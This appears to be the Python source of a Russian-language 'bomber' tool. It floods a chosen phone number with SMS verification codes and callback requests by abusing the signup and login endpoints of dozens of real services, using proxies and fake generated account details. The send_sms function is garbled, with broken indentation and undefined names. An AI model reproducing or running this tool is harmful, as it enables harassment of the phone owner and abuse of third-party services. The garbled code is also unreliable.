

import requests
import random, datetime, sys, time, argparse, os
from requests import post, get
import json
from termcolor import colored

version = 1.7
set = [1, 10]
fav_phones = []

if os.path.isfile("config.data") != 1:
    with open('config.data', 'w') as filehandle:  
       for listitem in set:
        filehandle.write('%s\n' % listitem)

if os.path.isfile("config.data") == 1:
    set = []
    with open('config.data', 'r') as filehandle:
        for line in filehandle:
            currentPlace = line[:-1]
            set.append(float(currentPlace))

if os.path.isfile("phones.data") != 1:
    with open('phones.data', 'w') as filehandle:  
       for listitem in fav_phones:
        filehandle.write('%s\n' % listitem)

if os.path.isfile("phones.data") == 1:
    with open('phones.data', 'r') as filehandle:
        for line in filehandle:
            currentPlace = line[:-1]
            fav_phones.append(currentPlace)

def return_phones():
    global fav_phones, _phone
    print(banner)
    for i in range(int(len(fav_phones)/2)):
        print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
    _phone = fav_phones[int(input("\n"))*2]
    
def save_phones():
    global fav_phones
    while True:
        print(banner)
        for i in range(int(len(fav_phones)/2)):
            print(str(i) +" - "+fav_phones[i*2] + " " + fav_phones[i*2+1])
        print("\n1 - Добавить номер\n2 - Удалить номер\n0 - Выйти")
        _menu = input()
        if _menu == "0": break
        if _menu == "1":
            fav_phones.append(input("Введите номер: "))
            fav_phones.append(input("Введите метку для номера: "))
        if _menu == "2":
            delete_phones = int(input("Введите номер номера, который вы хотите удалить: "))
            fav_phones.pop(delete_phones*2)
            fav_phones.pop(delete_phones*2)
        with open('phones.data', 'w') as filehandle:
            for listitem in fav_phones:
                filehandle.write('%s\n' % listitem)

def update():
    global version
    print("Проверка обновлений")
    try:
        upd=requests.get('https://raw.githubusercontent.com/Artem450-ss/NanoBomber/master/last_version.txt')
        upd_vers = float(upd.text[0:6])
        if upd_vers > version:
            print("Найдено обновление\n" + upd.text[0:6] + "\nИзменения:\n" + upd.text[7:])
            print("\nНачато обновление")
            upd_boom=requests.get('https://raw.githubusercontent.com/Artem450-ss/NanoBomber/master/NanoBomber.py')
            f = open("NanoBomber.py", "wb")
            f.write(upd_boom.content)
            f.close()
            print("\nОбновление завершено, откройте бомбер заново командой\npython boom.py")
            return "exit"
        elif upd_vers == version: print("Установлена последняя версия, вы прекрасны")
        elif upd_vers < version: print("Не хочешь попасть в команду?")
        else: print("Ошибка, файл обновлений не найден")
    except BaseException:
        print("Нет интернета, попробуйте позже")

def send_sms(serv):
    global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
   try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phonee,"email":"","city":""}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone[1:], maska="8(###)###-##-##")
						requests.post("http://xn---72-5cdaa0cclp5fkp4ewc.xn--p1ai/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://yaponchik.net/login/login.php",data={"login": "Y","countdown": "0","step": "phone","redirect": "/profile/","phone": phonee, "code":""}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://api.iconjob.co/api/auth/verification_code",json={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://cabinet.wi-fi.ru/api/auth/by-sms",data={"msisdn": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://ng-api.webbankir.com/user/v2/create",json={"lastName":"иванов","firstName":"иван","middleName":"иванович","mobilePhone":phone,"email":email,"smsCode":""}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://b.utair.ru/api/v1/profile/", json={"phone":phone,"confirmationGDPRDate": int(str(datetime.datetime.now().timestamp()).split('.')[0]) }, proxies=proxies, timeout=10)
						requests.post("https://b.utair.ru/api/v1/login/", json={"login":phone,"confirmation_type":"call_code"}, proxies=proxies, timeout=10) 
					except:
						pass
					try:
						# под сомнением 
						phonee=mask(str=phone, maska="#(###)###-##-##")
						requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"action":"auth","phone":phonee}, proxies=proxies, timeout=10)

						phonee=mask(str=phone, maska="+#(###)###-##-##")
						requests.post("https://www.r-ulybka.ru/login/form_ajax.php", data={"phone":"+7(915)350-99-08","action":"sendSmsAgain"}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},json={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": "+" + phone,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined",}}},headers={"Accept": "application/json"}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.post("https://www.top-shop.ru/login/loginByPhone/",data={"phone": phonee}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="8(###)###-##-##")
						requests.post("https://topbladebar.ru/user_account/ajax222.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",data={"phone_number": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://thehive.pro/auth/signup", json={"phone": "+"+phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://msk.tele2.ru/api/validation/number/"+phone, json={"sender": "Tele2"}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(phone, maska="+# (###) ### - ## - ##")
						requests.post("https://www.taxi-ritm.ru/ajax/ppp/ppp_back_call.php",data={"RECALL": "Y", "BACK_CALL_PHONE": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber", "phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="(+#)##########")
						requests.post("https://www.tanuki.ru/api/",json={"header": {"version": "2.0","userId": f"002ebf12-a125-5ddf-a739-67c3c5d{randint(20000, 90000)}","agent": {"device": "desktop", "version": "undefined undefined"},"langId": "1","cityId": "9",},"method": {"name": "sendSmsCode"},"data": {"phone": phonee, "type": 1}}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://lk.tabris.ru/reg/", data={"action": "phone", "phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://tabasko.su/",data={"IS_AJAX": "Y","COMPONENT_NAME": "AUTH","ACTION": "GET_CODE","LOGIN": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://www.sushi-profi.ru/api/order/order-call/",json={"phone": phone9, "name": name}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://client-api.sushi-master.ru/api/v1/auth/init",json={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="8(###)###-##-##")
						requests.post("https://xn--80aaispoxqe9b.xn--p1ai/user_account/ajax.php?do=sms_code",data={"phone": phonee}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="8 (###) ###-##-##")
						requests.post("http://sushigourmet.ru/auth",data={"phone": phonee, "stage": 1}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://sushifuji.ru/sms_send_ajax.php",data={"name": "false", "phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": email,"password": password,"phone": phone9,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.get("https://suandshi.ru/mobile_api/register_mobile_user",params={"phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone9, maska="8-###-###-##-##")
						requests.post("https://pizzasushiwok.ru/index.php",data={"mod_name": "registration","tpl": "restore_password","phone": phonee}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.get("https://www.sportmaster.ua/", params={"module": "users", "action": "SendSMSReg", "phone": phone}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						phonee=mask(str=phone, maska="+# (###) ###-##-##")
						requests.get("https://www.sportmaster.ru/user/session/sendSmsCode.do", params={"phone": phonee}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",data={"demo_number": "+" + phone, "ajax_demo_send": "1"}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://smart.space/api/users/request_confirmation_code/",json={"mobile": "+"+phone, "action": "confirm_mobile"}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://shopandshow.ru/sms/password-request/",data={"phone": "+"+phone, "resend": 0}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": "+"+phone},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"}, proxies=proxies, timeout=10)
					except:
						pass
					try:
						requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": "+"+phone},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"}, proxies=proxies, timeout=10)
					except:
						pass

def send_call(serv):
    global _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
    if serv == 0: requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
    else: print("Ошибка сервиса")

def bomb():
    global set, _phone, _phone9, _phone9dostavista, _phoneOstin, _phonePizzahut, _phoneGorzdrav, _name, password, username, email, _email
    _count_finish = 0
    print(banner)
    _phone = input('Введите номер для бомбинга (79xxxxxxxxx)\n1 - Выбрать номер из избранного\n')
    if _phone == "1": return_phones()
    try:
        _count = int(input('Количество сообщений: (100 по умолчанию)'))
    except:
        _count = 100
        
    try:
        _timer = float(input('Интервал между сообщениями: (0 по умолчанию) '))
    except:
        _timer = 0
        
    if _phone[0] == '+': _phone = _phone[1:]
    if _phone[0] == '8': _phone = '7'+_phone[1:]
    if _phone[0] == '9': _phone = '7'+_phone
        
    _name = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        
    _phone9 = _phone[1:]
    _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
    _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
    _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
    _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
        
    _email = _name+'@gmail.com'
    email = _name+'@gmail.com'
    
    def screen():
        print(banner)
        print("\nДля остановки немедленной нажмите Ctrl+Z\n")
        print('Номер: '+ _phone+ '\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
    
    while _count_finish != _count:
        randsh = random.randint(1,100)
        if set[1] > randsh:
            _service_call = random.randint(0,0)
            try:
                send_call(_service_call)
                screen()
                print("Сервис звонок " + str(_service_call) + " отправлен")
                _count_finish += 1
            except:
                screen()
                print("!!! Сервис звонок " + str(_service_call) + " не отправлен")
        else:
            _service_sms = random.randint(0, 48)
            try:
                send_sms(_service_sms)
                screen()
                print("Сервис смс " + str(_service_sms) + " отправлен")
                _count_finish += 1
            except:
                screen()
                print("!!! Сервис смс " + str(_service_sms) + " не отправлен")
        time.sleep(_timer)
    print(banner+'\nРезультат:\n\nУдачно ' + str(_count_finish) + ' из ' + str(_count))
    if set[0] == 1.0: exit()
    else: input("Бомбинг завершён, нажмите ENTER для выхода в главное меню")

def settings():
    global set
    while True:
        print(banner)
        print("\n1 - Выходить из программы поле бомбинга: " + str(set[0]))
        print("2 - Вероятность бомбинга звонками: " + str(set[1])+"%")
        print("\n0 - Выход из этого меню и сохранение")
        menu = input()
        if menu == "0":
            with open('config.data', 'w') as filehandle:  
               for listitem in set:
                filehandle.write('%s\n' % listitem)
            break
        elif menu == "1":
            if set[0] == 1: set[0] = 0
            elif set[0] == 0: set[0] = 1
        elif menu == "2":
            print(banner)
            set[1] = float(input("\nВведите шанс звонка: "))

def info():
    global banner, version
    print(banner+"\nВерсия "+str(version)+"\n\nБомбер создан только для развлекательных целей. За все действия что вы с ним проводите отвечаете только вы!\n\nСоздатель Telegram - @artem450\n\nНажмите ENTER чтобы выйти")
    input()

if update() == "exit": exit()
time.sleep(1)

while True:
    banner = ("\n" * 100)+ """
     ___  ___ ____  ___  / /  ___  __ _  / /  ___ ____
 / _ \/ _ `/ _ \/ _ \/ _ \/ _ \/  ' \/ _ \/ -_) __/
/_//_/\_,_/_//_/\___/_.__/\___/_/_/_/_.__/\__/_/   
                          
    """
    print(banner)
    menu = input("1 - БОМБЕР\n2 - НАСТРОЙКИ\n3 - Номера в избранном\n4 - ИНФОРМАЦИЯ\n\n0 - Выход\n")
    if menu == "0": exit()
    if menu == "1": bomb()
    if menu == "2": settings()
    if menu == "3": save_phones()
    if menu == "4": info()
